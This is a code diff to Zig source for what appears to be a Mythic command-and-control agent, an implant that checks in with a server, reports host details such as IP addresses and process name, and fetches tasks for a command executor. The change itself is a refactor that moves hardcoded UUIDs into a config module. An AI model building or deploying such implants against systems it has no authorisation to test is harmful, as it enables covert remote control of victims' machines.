@@ -4,6 +4,7 @@ const types = @import("types.zig");
 const commands = @import("commands.zig");
 const network = @import("network.zig");
 const utils = @import("utils.zig");
+const config = @import("config.zig");
 
 const print = std.debug.print;
 const ArrayList = std.ArrayList;
@@ -41,25 +42,23 @@ pub const MythicAgent = struct {
     is_running: bool,
     last_checkin: i64,
     
-    pub fn init(allocator: Allocator, config: AgentConfig) !Self {
+    pub fn init(allocator: Allocator, agent_config: types.AgentConfig) !Self {
         var crypto_utils = CryptoUtils.init(allocator);
         
-        const uuid = "a5c7bb07-e66c-4893-a6e9-edbc19c01d31";
         const session_id = try crypto_utils.generateSessionId();//session_id might be useful later. Not implemented yet
         const aes_key = CryptoUtils.generateAESKey();
-        const payload_uuid = "a5c7bb07-e66c-4893-a6e9-edbc19c01d31";
         
         return Self{
             .allocator = allocator,
-            .config = config,
-            .uuid = uuid,
+            .config = agent_config,
+            .uuid = config.uuid,
             .session_id = session_id,
-            .network_client = NetworkClient.init(allocator, config),
+            .network_client = NetworkClient.init(allocator, agent_config),
             .command_executor = CommandExecutor.init(allocator),
             .system_info = SystemInfo.init(allocator),
             .crypto_utils = crypto_utils,
             .aes_key = aes_key,
-            .payload_uuid = payload_uuid,
+            .payload_uuid = config.payload_uuid,
             .tasks = ArrayList(MythicTask).init(allocator),
             .pending_responses = ArrayList(MythicResponse).init(allocator),
             .is_running = false,
@@ -68,9 +67,7 @@ pub const MythicAgent = struct {
     }
     
     pub fn deinit(self: *Self) void {
-        //self.allocator.free(self.uuid);
         self.allocator.free(self.session_id);
-        //self.allocator.free(self.payload_uuid);
         self.tasks.deinit();
         self.pending_responses.deinit();
         self.network_client.deinit();
@@ -138,8 +135,6 @@ pub const MythicAgent = struct {
             .external_ip = external_ip,
             .ips = internal_ip,
             .process_name = process_name,
-            //.payload_uuid = self.payload_uuid,
-            //.encryption_key = try self.crypto_utils.encodeKey(&self.aes_key),
         };
         var json_buffer = std.ArrayList(u8).init(self.allocator);
         defer json_buffer.deinit();
@@ -201,7 +196,6 @@ pub const MythicAgent = struct {
         const get_tasking_data = .{
             .action = "get_tasking",
             .tasking_size = 1,
-            //.uuid = self.uuid,
         };
         
         var json_buffer = std.ArrayList(u8).init(self.allocator);
